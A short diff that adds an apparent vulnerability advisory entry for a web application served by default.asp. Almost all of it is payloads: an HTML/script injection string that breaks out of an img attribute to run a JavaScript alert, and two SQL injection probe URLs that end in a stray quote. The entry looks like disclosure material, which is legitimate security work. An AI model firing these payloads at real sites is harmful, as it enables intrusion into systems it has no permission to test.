@@ -1,0 +1,9 @@
+HTML Injection
+
+<img src=&quot;http://www.example.com/default.asp?sec=1&amp;ma1=&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+
+
+SQL Injection
+
+http://[host]/default.asp?sec=64&ma1=tag&tag=CMS'
+http://[host]/default.asp=sec=1'
